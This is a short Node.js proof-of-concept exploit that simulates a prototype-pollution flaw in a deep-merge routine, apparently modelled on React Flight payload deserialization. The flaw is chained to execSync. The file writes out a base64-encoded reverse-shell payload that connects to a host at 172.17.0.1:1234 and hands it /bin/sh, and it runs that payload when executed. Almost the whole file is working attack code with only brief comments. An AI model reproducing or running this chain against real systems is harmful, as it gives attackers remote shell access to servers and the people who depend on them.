const { execSync } = require('child_process');

// --- THE INFRASTRUCTURE ---
const gadgetMap = {
    "LogGadget": (data) => console.log(`[LOG]: Processing ${data}`),
    "ConfigGadget": (obj) => {
        // Prototype Pollution Sink: looks for "shell" on the object
        const shell = obj.shell || "/usr/bin/node"; 
        console.log(`[CONFIG]: Using shell: ${shell}`);
        return shell;
    }
};

// --- THE VULNERABLE BACKEND ---
const execSink = (cmd) => {
    console.log(`\n!!! [SINK REACHED] !!!`);
    console.log(`[SHELL]: Executing -> ${cmd}`);
    try {
        const output = execSync(cmd);
        console.log(output.toString());
    } catch (e) {
        console.log("[ERROR]: Command failed (this is expected if the shell hangs for the connection)");
    }
};

function flightDeepMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__') {
            // THE VULNERABILITY: Polluting the global Object prototype
            Object.assign(Object.prototype, source[key]);
        } else if (typeof source[key] === 'object' && source[key] !== null) {
            target[key] = target[key] || {};
            flightDeepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// --- THE ATTACK ---
function handleFlightRequest(incomingPayload) {
    let internalState = {};

    console.log("--- Step 1: Deserializing Flight Payload ---");
    flightDeepMerge(internalState, incomingPayload);

    console.log("--- Step 2: Triggering Gadget Chain ---");
    const currentShell = gadgetMap["ConfigGadget"](internalState);

    if (currentShell && internalState.execute) {
        // The polluted 'shell' (node) and 'execute' (true) are used here
        execSink(`${currentShell} -e "${internalState.args}"`);
    }
}

// --- THE MALICIOUS INPUT ---
// Note: The IP '172.17.0.1' is the standard Docker host gateway. 
// If you are on Mac/Windows, you can use 'host.docker.internal'.
const payload = "const net=require('net'),{spawn}=require('child_process'),client=new net.Socket();client.connect(1234,'172.17.0.1',()=>{const s=spawn('/bin/sh');client.pipe(s.stdin);s.stdout.pipe(client);s.stderr.pipe(client);});";
const base64Payload = Buffer.from(payload).toString('base64');

const unverifiedReactFlightPayload = {
    "__proto__": {
        "shell": "node", 
        "execute": true 
    },
    "args": `eval(Buffer.from('${base64Payload}','base64').toString())`
};  

handleFlightRequest(unverifiedReactFlightPayload);